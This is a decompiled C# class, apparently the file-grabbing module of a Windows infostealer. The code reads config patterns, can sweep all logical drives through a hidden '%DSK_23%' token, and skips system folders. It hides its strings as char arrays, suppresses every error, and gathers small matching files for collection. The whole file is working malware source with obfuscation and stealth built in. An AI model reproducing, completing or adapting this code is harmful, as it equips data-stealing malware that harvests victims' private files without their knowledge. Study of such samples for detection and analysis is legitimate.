using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000011 RID: 17
public static class RecoursiveFileGrabber
{
	// Token: 0x0600004B RID: 75 RVA: 0x000047A0 File Offset: 0x000029A0
	public static List<ScannedFile> Scan(IEnumerable<string> patterns)
	{
		List<ScannedFile> list = new List<ScannedFile>();
		try
		{
			foreach (string text in patterns)
			{
				try
				{
					string[] array = text.Split(new string[]
					{
						"|"
					}, StringSplitOptions.RemoveEmptyEntries);
					if (array != null && array.Length > 2)
					{
						string text2 = Environment.ExpandEnvironmentVariables(array[0]);
						string[] searchPatterns = array[1].Split(new string[]
						{
							","
						}, StringSplitOptions.RemoveEmptyEntries);
						string value = array[2];
						long num = 3097152L;
						if (array != null && array.Length == 4)
						{
							long.TryParse(array[3], out num);
						}
						if (text2 == new string(new char[]
						{
							'%',
							'D',
							'S',
							'K',
							'_',
							'2',
							'3',
							'%'
						}))
						{
							foreach (string rootPath in Environment.GetLogicalDrives())
							{
								try
								{
									foreach (string text3 in RecoursiveFileGrabber.GetFiles(rootPath, (SearchOption)Convert.ToInt32(value), searchPatterns))
									{
										try
										{
											FileInfo fileInfo = new FileInfo(text3);
											if (fileInfo.Length > 0L && fileInfo.Length <= num)
											{
												string[] array2 = fileInfo.Directory.FullName.Split(new string[]
												{
													new string(new char[]
													{
														':',
														'\\'
													})
												}, StringSplitOptions.RemoveEmptyEntries);
												list.Add(new ScannedFile(fileInfo.FullName)
												{
													DirOfFile = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
													PathOfFile = text3
												});
											}
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
						}
						else
						{
							foreach (string text4 in RecoursiveFileGrabber.GetFiles(text2, (SearchOption)Convert.ToInt32(value), searchPatterns))
							{
								try
								{
									FileInfo fileInfo2 = new FileInfo(text4);
									if (fileInfo2.Length > 0L && fileInfo2.Length <= num)
									{
										string[] array3 = fileInfo2.Directory.FullName.Split(new string[]
										{
											new string(new char[]
											{
												':',
												'\\'
											})
										}, StringSplitOptions.RemoveEmptyEntries);
										list.Add(new ScannedFile(fileInfo2.FullName)
										{
											DirOfFile = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
											PathOfFile = text4
										});
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600004C RID: 76 RVA: 0x00004B00 File Offset: 0x00002D00
	public static IEnumerable<string> GetFiles(string rootPath, SearchOption searchOption, string[] searchPatterns)
	{
		List<string> list = new List<string>
		{
			new string(new char[]
			{
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				' ',
				'(',
				'x',
				'8',
				'6',
				')',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'D',
				'a',
				't',
				'a',
				'\\'
			})
		};
		IEnumerable<string> enumerable = Enumerable.Empty<string>();
		if (searchOption == SearchOption.AllDirectories)
		{
			try
			{
				foreach (string text in Directory.EnumerateDirectories(rootPath))
				{
					if (list != null && list.Any<string>())
					{
						bool flag = false;
						foreach (string value in list)
						{
							if (text.Contains(value))
							{
								flag = true;
								break;
							}
						}
						if (flag)
						{
							continue;
						}
					}
					enumerable = enumerable.Concat(RecoursiveFileGrabber.GetFiles(text, searchOption, searchPatterns));
				}
			}
			catch
			{
			}
		}
		foreach (string searchPattern in searchPatterns)
		{
			try
			{
				enumerable = enumerable.Concat(Directory.GetFiles(rootPath, searchPattern));
			}
			catch
			{
			}
		}
		return enumerable;
	}
}
